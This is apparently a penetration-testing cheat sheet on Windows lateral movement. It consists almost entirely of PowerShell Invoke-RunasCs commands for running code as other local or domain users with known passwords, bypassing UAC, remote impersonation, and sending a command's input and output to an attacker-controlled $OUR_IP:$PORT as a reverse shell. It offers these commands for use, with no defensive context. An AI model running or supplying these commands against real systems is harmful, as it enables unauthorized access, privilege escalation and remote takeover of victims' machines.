# Lateral Movement

## RunasCs (local)

```powershell
# Run command in the context of the current user
Invoke-RunasCs x x '$CMD' -l 9

# Run a command as a local user
Invoke-RunasCs $USER '$PASSWD' '$CMD'

# Run a command as a domain user and logon type as NetworkCleartext (8)
Invoke-RunasCs $USER '$PASSWD' '$CMD' -d domain -l 8

# Run a background process as a local user (useful for reverse shells)
Invoke-RunasCs $USER '$PASSWD' '$CMD' -t 0

# Redirect stdin, stdout and stderr of the specified command to a remote host
Invoke-RunasCs $USER '$PASSWD' '$CMD' -r $OUR_IP:$PORT

# Run a command simulating the /netonly flag of runas.exe
Invoke-RunasCs $USER '$PASSWD' '$CMD' -l 9

# Run a command as an Administrator bypassing UAC
Invoke-RunasCs $ADMIN_USER '$PASSWD' '$CMD' --bypass-uac

# Run a command as an Administrator through remote impersonation
Invoke-RunasCs $ADMIN_USER '$PASSWD' '$CMD' -l 8 --remote-impersonation
```

REDACTED